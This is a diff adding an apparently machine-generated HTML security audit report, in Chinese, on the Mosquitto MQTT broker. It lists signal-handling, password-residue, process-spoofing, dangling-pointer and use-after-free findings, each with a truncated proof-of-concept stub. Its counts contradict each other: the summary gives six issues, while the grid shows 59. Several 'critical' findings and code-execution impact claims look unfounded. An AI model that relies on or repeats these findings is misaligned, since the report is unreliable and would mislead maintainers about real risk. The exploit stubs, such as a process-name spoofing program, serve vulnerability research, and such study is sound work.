@@ -1,0 +1,2216 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - mosquitto</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> mosquitto | <strong>语言:</strong> {"C": 45.3, "Python": 41.7, "C++": 13.0} | <strong>时间:</strong> 2026-07-11 19:14:25</p>
+
+    <h2>执行摘要</h2>
+    <p>本次安全审计针对Eclipse Mosquitto项目（版本基于GitHub仓库https://github.com/eclipse-mosquitto/mosquitto）进行了源代码安全审查。项目主要使用C、Python和C++语言，包含1038个文件，总计152427行代码。审计共发现6个安全漏洞，其中高危漏洞2个，中危漏洞3个，低危漏洞1个。主要风险集中在不安全的信号处理、密码在内存中残留、TOCTOU竞态条件以及进程名欺骗导致的信号劫持。建议优先修复高危漏洞，特别是密码内存残留问题，该漏洞可能导致用户凭证泄露。</p>
+    <p><strong>风险评分:</strong> 72/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>6</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>24</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>27</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>2</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-4D0B76A0 - 不安全的信号处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps/mosquitto_ctrl/ctrl_shell.c:1</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void signal_winch(int signal)</code></pre>
+                <p><strong>数据流:</strong> 信号处理函数中调用rl_resize_terminal()</p>
+                <p><strong>判断理由:</strong> 在信号处理函数中调用非异步信号安全的函数可能导致竞态条件</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可能导致mosquitto_ctrl进程崩溃或挂起，造成拒绝服务。在更严重的情况下，由于rl_resize_terminal()内部可能使用malloc等非安全函数，信号处理期间的竞态条件可能导致内存损坏，进而可能被利用于执行任意代码。但考虑到信号处理函数的特殊性，实际利用难度较高，主要风险是拒绝服务攻击。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 不安全的信号处理PoC
+# 漏洞: signal_winch中调用rl_resize_terminal()非异步信号安全函数
+
+# PoC 1: 通过快速发送SIGWINCH信号触发竞态条件
+# 利用mosquitto_ctrl的ctrl_shell组件
+
+echo &quot;[*] 演示不安全的信号处理漏洞 (VULN-4D0B76A0)&quot;
+echo &quot;[*] 漏洞类型: 信号处理函数中调用非异步信号安全函数&quot;
+echo &quot;[*] 目标函数: signal_winch -&gt; rl_resize_terminal()&quot;
+echo &quot;&quot;
+
+# 模拟场景: 当mosquitto_ctrl运行时，快速发送SIGWINCH信号
+# 这可能导致readline内部状态损坏
+
+# 步骤1: 启动mosquitto_ctrl (假设已编译)
+# mosquitto_ctrl -h localhost -p 1883 shell &amp;
+# CTRL_PID=$!
+
+# 步骤</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-3AA7BBB0 - 不安全的密码处理 - 密码在内存中残留</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> apps\mosquitto_passwd\get_password.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>char pw1[MAX_BUFFER_LEN], pw2[MAX_BUFFER_LEN];
+...
+strncpy(password, pw1, minLen);
+return 0;</code></pre>
+                <p><strong>数据流:</strong> 密码存储在栈缓冲区pw1和pw2中，函数返回后缓冲区内容未被清除，可能被其他函数或攻击者读取</p>
+                <p><strong>判断理由:</strong> 密码存储在栈上分配的缓冲区中，函数返回后没有使用memset或类似函数清除密码内容。这违反了密码处理的最佳安全实践，可能导致敏感信息泄露。攻击者可以通过内存转储或利用其他漏洞读取残留的密码数据。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过内存分析获取用户的明文密码。具体影响包括：1) 攻击者可以通过读取进程内存（如/proc/[pid]/mem）获取密码；2) 如果进程崩溃，核心转储文件中可能包含密码；3) 攻击者可以利用其他漏洞（如缓冲区溢出）读取栈内存中的密码；4) 密码可能被其他函数意外读取。这违反了密码处理的安全最佳实践，可能导致用户账户被未授权访问。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC: 演示Mosquitto密码在栈内存中残留的漏洞
+ * 仅供安全研究使用
+ * 
+ * 编译: gcc -o poc_password_residue poc_password_residue.c
+ * 运行: ./poc_password_residue
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#define MAX_BUFFER_LEN 65500
+
+/* 模拟漏洞函数 - 密码在栈上残留 */
+int vulnerable_get_password(const char *prompt, char *password, size_t len)
+{
+    char pw1[MAX_BUFFER_LEN];  /* 栈缓冲区，函数返回后不清零 */
+    size_t minLen;
+    
+    minLen = len &lt; MAX_BUFFER_LEN ? len : M</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-C2791450 - TOCTOU竞争条件</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps/mosquitto_signal/signal_unix.c:47</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>pid = atoi(d-&gt;d_name);
+if(pid &gt; 0){
+    snprintf(pathbuf, sizeof(pathbuf), &quot;/proc/%s/cmdline&quot;, d-&gt;d_name);
+    fptr = fopen(pathbuf, &quot;r&quot;);</code></pre>
+                <p><strong>数据流:</strong> readdir()返回目录项 -&gt; atoi()解析进程ID -&gt; snprintf()构造路径 -&gt; fopen()打开文件</p>
+                <p><strong>判断理由:</strong> 在readdir()读取/proc目录项和后续fopen()打开对应cmdline文件之间存在时间窗口。攻击者可以在检查后立即终止进程并创建同名的恶意进程，导致信号发送到错误的进程。这是一个经典的TOCTOU(Time-of-Check Time-of-Use)竞争条件漏洞。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) 信号发送到错误的进程，可能导致非mosquitto进程收到SIGHUP/SIGINT等信号；2) 拒绝服务攻击，通过向关键系统进程发送信号；3) 权限提升，如果mosquitto以高权限运行，攻击者可能通过信号劫持影响高权限进程；4) 日志轮转或配置重载操作被重定向到恶意进程。虽然攻击条件较为苛刻，但在高负载系统或攻击者能精确控制进程创建时序的情况下是可利用的。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-C2791450 - TOCTOU race condition in mosquitto_signal
+ * 仅供研究使用
+ *
+ * 编译: gcc -o poc_race poc_race.c -lpthread
+ * 运行: ./poc_race &lt;mosquitto_pid&gt;
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;errno.h&gt;
+
+/* 目标mosquitto进程PID */
+pid_t target_pid;
+
+</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-6A55CCD9 - 不安全的进程匹配逻辑</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps/mosquitto_signal/signal_unix.c:55</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>cmd = strrchr(cmdline, &#x27;/&#x27;);
+if(cmd){
+    cmd += 1;
+}else{
+    cmd = cmdline;
+}
+if(!strcmp(cmd, &quot;mosquitto&quot;)){
+    if(kill(pid, sig) &lt; 0){</code></pre>
+                <p><strong>数据流:</strong> fgets()读取cmdline -&gt; strrchr()提取最后一段 -&gt; strcmp()匹配&quot;mosquitto&quot; -&gt; kill()发送信号</p>
+                <p><strong>判断理由:</strong> 仅通过进程命令行中最后一个&#x27;/&#x27;后的字符串是否等于&quot;mosquitto&quot;来判断目标进程，匹配逻辑过于简单。攻击者可以创建一个名为&quot;mosquitto&quot;的恶意进程，或者重命名恶意程序为&quot;mosquitto&quot;来接收信号。更安全的做法是验证进程的完整路径或使用其他身份验证机制。</p>
+                <p><strong>影响分析:</strong> 攻击者可以创建一个名为&#x27;mosquitto&#x27;的恶意进程，该进程会被signal_all函数错误地识别为目标进程。通过向该恶意进程发送信号，攻击者可以实现：1) 拒绝服务 - 消耗系统资源；2) 进程劫持 - 拦截本应发送给真实mosquitto进程的信号；3) 信息泄露 - 通过信号处理程序获取系统信息。由于匹配逻辑仅依赖进程名，攻击者可以轻松绕过安全控制。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 概念验证代码
+# 漏洞利用：通过创建名为mosquitto的恶意进程来接收信号
+
+# PoC 1: 创建恶意mosquitto进程并接收信号
+cat &gt; /tmp/malicious_mosquitto.c &lt;&lt; &#x27;EOF&#x27;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+
+volatile sig_atomic_t signal_received = 0;
+
+void signal_handler(int sig) {
+    signal_received = 1;
+    printf(&quot;[!] 恶意进程收到信号: %d\n&quot;, sig);
+    printf(&quot;[!] 漏洞利用成功! 进程名: mosquitto\n&quot;);
+}
+
+int main() {
+    // 注册信号处理器
+    sig</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-90F3B35D - 不安全的进程枚举</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps\mosquitto_signal\signal_windows.c:63</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(!strcasecmp(procname, &quot;mosquitto.exe&quot;)){
+    pid = GetProcessId(hproc);
+    send_signal(pid, msig);
+}</code></pre>
+                <p><strong>数据流:</strong> EnumProcesses枚举所有进程 -&gt; OpenProcess打开进程 -&gt; GetModuleBaseName获取进程名 -&gt; 字符串比较匹配mosquitto.exe</p>
+                <p><strong>判断理由:</strong> 仅通过进程名匹配来确定目标进程，攻击者可以创建一个名为mosquitto.exe的恶意进程来接收信号。没有验证进程的完整性、数字签名或路径信息，导致信号可能被发送到恶意进程。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过创建名为mosquitto.exe的恶意进程来劫持mosquitto信号。当signal_all()函数被调用时，它会枚举所有进程并通过进程名匹配来发送信号。由于没有验证进程的数字签名、路径或完整性，恶意进程可以接收本应发送给真正mosquitto进程的信号。攻击者可以拦截reload（重载配置）、shutdown（关闭服务）、log_rotate（日志轮转）等关键信号，导致服务配置被篡改、服务被恶意关闭或日志被破坏。在更严重的情况下，攻击者可以模拟信号响应，使真正的mosquitto进程无法接收到信号，从而影响服务的正常运行。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC: Mosquitto Signal Hijacking via Process Name Spoofing
+ * 仅供研究使用 - Proof of Concept for Security Research Only
+ * 
+ * 编译: gcc -o mosquitto_poc.exe mosquitto_poc.c -lpsapi
+ * 或使用MinGW: x86_64-w64-mingw32-gcc -o mosquitto_poc.exe mosquitto_poc.c -lpsapi
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#define MAX_PROCESSES 2048
+#define MAX_PATH_LEN 260
+
+// 模拟mosquitto信号类型
+enum mosq_signal {
+    MSIG_CONFIG_RELOAD = 0,
+    MSIG_LOG_ROTATE,
+    MSIG_SHUTDO</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-E4D14BFA - 不安全的信号发送机制</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps\mosquitto_signal\signal_windows.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>snprintf(eventbuf, sizeof(eventbuf), &quot;mosq%d_%s&quot;, pid, msig_to_string(msig));
+evt = OpenEvent(EVENT_MODIFY_STATE, FALSE, eventbuf);</code></pre>
+                <p><strong>数据流:</strong> PID和信号类型拼接成事件名 -&gt; OpenEvent打开命名事件 -&gt; PulseEvent触发事件</p>
+                <p><strong>判断理由:</strong> 使用可预测的命名事件模式&#x27;mosq{PID}_{signal}&#x27;，攻击者可以创建同名的命名事件来劫持信号。任何能够枚举进程的用户都可以创建这些命名事件，导致信号被拦截或伪造。</p>
+                <p><strong>影响分析:</strong> 攻击者可以劫持mosquitto的信号机制，导致：1) 信号被拦截，mosquitto无法收到配置重载、日志轮转、关闭等信号；2) 信号被伪造，攻击者可以模拟发送任意信号给mosquitto；3) 信号被延迟，影响mosquitto的正常操作时序。由于信号用于管理关键操作（如配置重载、安全关闭），成功利用可能导致服务中断、配置不一致或拒绝服务。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC: Mosquitto Windows Signal Hijacking
+ * 仅供研究使用 - 仅用于安全审查
+ * 
+ * 编译: cl /EHsc signal_hijack_poc.c
+ * 或: gcc -o signal_hijack_poc.exe signal_hijack_poc.c -ladvapi32
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+/* 信号类型枚举（与mosquitto一致） */
+enum mosq_signal {
+    MSIG_CONFIG_RELOAD = 0,
+    MSIG_LOG_ROTATE,
+    MSIG_SHUTDOWN,
+    MSIG_TREE_PRINT,
+    MSIG_XTREPORT
+};
+
+/* 信号名称映射（与mosquitto一致） */
+const char* msig_to_string(enum mo</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-CF3435CA - 不安全的API使用</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> apps\mosquitto_signal\signal_windows.c:84</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>res = PulseEvent(evt);</code></pre>
+                <p><strong>数据流:</strong> OpenEvent获取事件句柄 -&gt; PulseEvent触发事件</p>
+                <p><strong>判断理由:</strong> PulseEvent()函数已被微软标记为不安全，因为它不可靠且可能导致死锁。在Windows Vista及更高版本中，PulseEvent不会唤醒等待的线程，导致信号可能丢失。应使用SetEvent()替代。</p>
+                <p><strong>影响分析:</strong> 该漏洞影响Mosquitto MQTT broker在Windows平台上的信号处理机制。当使用PulseEvent()发送信号时，等待线程可能无法收到通知，导致：
+1. 配置重载失败 - 修改配置文件后无法生效
+2. 日志轮转失败 - 日志文件无法正常切换
+3. 优雅关闭失败 - 服务无法正常停止
+4. 调试信息无法获取 - tree_print和xtreport功能失效
+
+在Windows Vista+系统上，此问题更为严重，因为PulseEvent()在这些系统上几乎不会唤醒任何等待线程。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-CF3435CA - PulseEvent() Unsafe API Usage
+ * 仅供研究使用 (For Research Purposes Only)
+ * 
+ * 此PoC演示了PulseEvent()在Windows Vista+上的不可靠行为
+ * 通过创建等待线程并观察信号丢失现象
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define MAX_THREADS 5
+#define TEST_ITERATIONS 10
+
+// 全局事件句柄
+HANDLE g_hEvent = NULL;
+
+// 统计变量
+volatile LONG g_signalsReceived = 0;
+volatile LONG g_totalSignalsSent = 0;
+
+// 等待线程函数
+DWORD WINAPI WaitThread(LPVOID lpParam) {
+    int threadId = (int)(I</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-C73EBCC5 - 不安全的信号处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> client/rr_client.c:68</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void my_signal_handler(int signum)
+{
+	if(signum == SIGALRM){
+		process_messages = false;
+		mosquitto_disconnect_v5(g_mosq, MQTT_RC_DISCONNECT_WITH_WILL_MSG, cfg.disconnect_props);
+		timed_out = true;
+	}
+}</code></pre>
+                <p><strong>数据流:</strong> 信号处理函数中调用了非异步信号安全的函数mosquitto_disconnect_v5()</p>
+                <p><strong>判断理由:</strong> 在信号处理函数中调用了mosquitto_disconnect_v5()，该函数不是异步信号安全的。在信号处理函数中调用非异步信号安全的函数可能导致死锁、数据竞争或未定义行为。正确的做法是在信号处理函数中仅设置volatile sig_atomic_t类型的标志变量，然后在主循环中检查该标志并执行相应操作。</p>
+                <p><strong>影响分析:</strong> 该漏洞可能导致以下影响：
+1. 死锁：信号处理函数尝试获取已被主线程持有的锁，导致程序永久挂起
+2. 数据竞争：信号处理函数和主线程同时访问共享数据（如g_mosq指针）
+3. 未定义行为：在信号上下文中调用非异步信号安全函数可能导致内存损坏
+4. 拒绝服务：攻击者可以通过触发超时信号导致客户端崩溃或挂起
+5. 安全风险：在极端情况下，数据竞争可能导致内存损坏，进而被利用执行任意代码</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: 不安全的信号处理 (VULN-C73EBCC5)
+ * 文件: client/rr_client.c
+ * 行号: 68
+ * 
+ * 此PoC演示了在信号处理函数中调用非异步信号安全函数
+ * mosquitto_disconnect_v5() 可能导致的问题
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdatomic.h&gt;
+
+/* 模拟mosquitto库中的锁 */
+pthread_mutex_t g_mosquitto_lock = PTHREAD_MUTEX_INITIALIZER;
+
+/* 模拟mosquitto连接结构 */
+typedef struct {
+    int sock_fd;
+    int </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-CBB1D4F5 - 不安全的信号处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> client/sub_client.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>static void my_signal_handler(int signum)
+{
+	if(signum == SIGALRM || signum == SIGTERM || signum == SIGINT){
+		if(connack_received){
+			process_messages = false;
+			mosquitto_disconnect_v5(g_mosq, MQTT_RC_DISCONNECT_WITH_WILL_MSG, cfg.disconnect_props);
+		}else{
+			exit(-1);
+		}
+		run = false;
+	}
+	if(signum == SIGALRM){
+		timed_out = true;
+	}
+}</code></pre>
+                <p><strong>数据流:</strong> 信号处理函数中调用了mosquitto_disconnect_v5()和exit()等非异步信号安全函数。</p>
+                <p><strong>判断理由:</strong> 在信号处理函数中调用非异步信号安全的函数（如mosquitto_disconnect_v5、exit、printf等）可能导致竞态条件、死锁或未定义行为。信号处理函数应只设置volatile sig_atomic_t类型的标志变量。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发送信号触发非异步信号安全函数调用，可能导致：1) 死锁：信号处理函数尝试获取主线程已持有的锁，导致程序永久挂起；2) 数据损坏：信号处理函数修改全局变量时与主线程产生竞态条件；3) 未定义行为：在信号上下文中调用exit()可能导致atexit处理函数在非安全状态下执行；4) 拒绝服务：通过发送多个信号使程序进入不一致状态。CVSS评分约5.9（中等），攻击复杂度低，但需要本地或网络信号发送能力。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * 仅供研究使用 - 不安全的信号处理漏洞PoC
+ * 针对Mosquitto client/sub_client.c中的信号处理函数
+ * 
+ * 编译: gcc -o poc_signal_unsafe poc_signal_unsafe.c -lpthread
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdatomic.h&gt;
+
+/* 模拟mosquitto库中的关键数据结构 */
+typedef struct {
+    int disconnect_props;
+    int dummy_data;
+} mosq_config;
+
+/* 模拟全局变量，与原始代码对应 */
+mosq_config cfg = {0};
+volatile int run = 1;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-41B297FB - 内存泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> fuzzing\broker\fuzz_packet_read_base.c:78</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(fuzz_packet_read_init(context)){
+    free(context-&gt;bridge);
+    context-&gt;bridge = NULL;
+    free(db.config);
+    return 1;
+}</code></pre>
+                <p><strong>数据流:</strong> fuzz_packet_read_init失败 -&gt; 释放bridge和config但未释放context和data_heap</p>
+                <p><strong>判断理由:</strong> 当fuzz_packet_read_init返回非零值时，函数释放了context-&gt;bridge和db.config，但没有释放之前分配的context和data_heap。这导致两个内存块泄漏。</p>
+                <p><strong>影响分析:</strong> 该漏洞位于fuzzing测试代码中，直接影响fuzzing测试的稳定性。在持续fuzzing过程中，每次触发漏洞路径都会泄漏context(约1KB)和data_heap(输入大小)内存。长时间运行会导致内存耗尽，使fuzzing测试提前终止或变得不稳定。更严重的是，如果生产代码中存在类似的错误处理模式，可能导致服务内存泄漏，最终引发拒绝服务(DoS)攻击。泄漏的内存块大小取决于输入数据，最大可达268MB，单次泄漏即可造成显著影响。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: VULN-41B297FB - fuzz_packet_read_base.c 内存泄漏
+ * 
+ * 此PoC通过构造特定输入触发fuzz_packet_read_init失败路径，
+ * 验证context和data_heap内存泄漏。
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+/* 模拟fuzz_packet_read_init函数，返回非零值触发漏洞路径 */
+int mock_fuzz_packet_read_init(void *context) {
+    (void)context;
+    /* 模拟初始化失败，返回非零值 */
+    return 1;
+}
+
+/* 模拟context__init函数 */
+void* mock_context__init(void) {
+    return malloc(1024); /* 模拟con</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-00780B8E - 悬空指针</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> fuzzing\libcommon\libcommon_fuzz_topic_matching.cpp:12</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>const char *string1 = fuzzer_input.string1().c_str();
+const char *string2 = fuzzer_input.string2().c_str();</code></pre>
+                <p><strong>数据流:</strong> fuzzer_input.string1()返回临时std::string -&gt; .c_str()获取指针 -&gt; 临时对象销毁 -&gt; string1成为悬空指针</p>
+                <p><strong>判断理由:</strong> fuzzer_input.string1()返回的是std::string的副本（临时对象），调用.c_str()后，该临时对象在完整表达式结束时被销毁。string1指针指向已释放的内存，后续使用该指针（如传递给mosquitto_topic_matches_sub）会导致未定义行为。这是典型的悬空指针漏洞，可能导致内存损坏或任意代码执行。</p>
+                <p><strong>影响分析:</strong> 该漏洞为悬空指针导致的未定义行为。攻击者可通过精心构造的输入触发漏洞，导致：1) 程序崩溃（拒绝服务）；2) 读取已释放内存造成信息泄露；3) 在特定内存布局下，可能实现任意代码执行。由于漏洞位于fuzzing测试代码中，但mosquitto库本身在生产环境中使用相同API，实际风险取决于生产代码是否也存在类似问题。CVSS评分估计为7.5-9.0（高危至严重）。</p>
+                <details><summary>PoC代码</summary><pre><code>// 仅供研究使用
+// 悬空指针漏洞PoC - 演示临时std::string对象销毁导致指针失效
+
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;cstring&gt;
+
+// 模拟fuzzer_input结构
+class FuzzerInput {
+public:
+    // 返回临时std::string对象（按值返回）
+    std::string string1() const {
+        std::string temp = &quot;test/topic/1&quot;;
+        return temp;  // 返回副本，调用方获得临时对象
+    }
+    
+    std::string string2() const {
+        std::string temp = &quot;test/topic/+&quot;;
+        return temp;
+    }
+    
+    bool has_username() const { retu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-5C23662E - 悬空指针</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> fuzzing\libcommon\libcommon_fuzz_topic_matching.cpp:20</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(fuzzer_input.has_clientid()){
+		clientid = fuzzer_input.clientid().c_str();
+	}</code></pre>
+                <p><strong>数据流:</strong> fuzzer_input.clientid()返回临时std::string -&gt; .c_str()获取指针 -&gt; 临时对象销毁 -&gt; clientid成为悬空指针</p>
+                <p><strong>判断理由:</strong> 与username相同的问题。clientid指针指向已销毁的临时std::string对象，后续在函数调用中使用该指针会导致未定义行为。</p>
+                <p><strong>影响分析:</strong> 该悬空指针漏洞可能导致以下影响：1) 程序崩溃 - 访问已释放的内存导致段错误(SIGSEGV)；2) 信息泄露 - 读取到其他对象的数据，可能泄露敏感信息；3) 逻辑错误 - 使用错误的clientid值导致认证绕过或权限提升；4) 在fuzzing场景中，可能导致fuzzer误报或漏报，影响测试结果的准确性。虽然该漏洞存在于fuzzing测试代码中，但反映了生产代码中可能存在的类似问题模式。</p>
+                <details><summary>PoC代码</summary><pre><code>// 仅供研究使用
+// PoC: 悬空指针漏洞 - clientid临时对象生命周期问题
+
+#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;cstring&gt;
+
+// 模拟漏洞场景的简化代码
+class FuzzerInput {
+public:
+    bool has_clientid() const { return true; }
+    std::string clientid() const {
+        // 返回临时std::string对象
+        return std::string(&quot;test_client_12345&quot;);
+    }
+    bool has_username() const { return true; }
+    std::string username() const {
+        return std::string(&quot;test_user&quot;);
+    }
+    std::string str</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-E0DFBE16 - Use-After-Free / Dangling Pointer</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> lib/helpers.c:153</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>mosq = mosquitto_new(clientid, clean_session, &amp;cb_userdata);</code></pre>
+                <p><strong>数据流:</strong> cb_userdata is a stack-local variable in mosquitto_subscribe_callback(). Its address is passed to mosquitto_new() as userdata. After mosquitto_new() returns, the pointer stored in mosq-&gt;userdata points to the stack frame of mosquitto_subscribe_callback(). When mosquitto_subscribe_callback() returns, that stack memory is freed/reused. Any subsequent callback (on_connect, on_message_callback) that dereferences this pointer will access invalid memory.</p>
+                <p><strong>判断理由:</strong> The struct userdata__callback &#x27;cb_userdata&#x27; is allocated on the stack inside mosquitto_subscribe_callback(). Its address is passed to mosquitto_new() as the &#x27;obj&#x27; parameter, which stores it internally as userdata. The callbacks on_connect() and on_message_callback() cast this pointer back to struct userdata__callback* and dereference it. However, once mosquitto_subscribe_callback() returns, the stack frame is invalidated. The callbacks may be invoked later (e.g., during mosquitto_loop_forever() or after the function returns), leading to use-after-free of stack memory. This is a critical vulnerability that can cause arbitrary code execution or crashes.</p>
+                <p><strong>影响分析:</strong> 这是一个严重的Use-After-Free漏洞。攻击者可以利用此漏洞实现：1) 任意代码执行 - 通过控制已释放栈内存的内容，在回调函数中劫持执行流；2) 信息泄露 - 读取已释放栈内存中的敏感数据；3) 拒绝服务 - 通过触发崩溃导致服务中断。由于漏洞位于库的核心函数中，任何使用mosquitto_subscribe_callback()的应用程序都会受影响。攻击者可以通过控制topic、callback等参数来影响cb_userdata的内容，进而控制利用路径。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-E0DFBE16 - Use-After-Free in mosquitto_subscribe_callback()
+ * 仅供研究使用 (For research purposes only)
+ *
+ * 编译: gcc -o poc_uaf poc_uaf.c -lmosquitto
+ * 运行: ./poc_uaf &lt;broker_host&gt; &lt;broker_port&gt;
+ */
+
+#include &lt;stdio.h&gt;
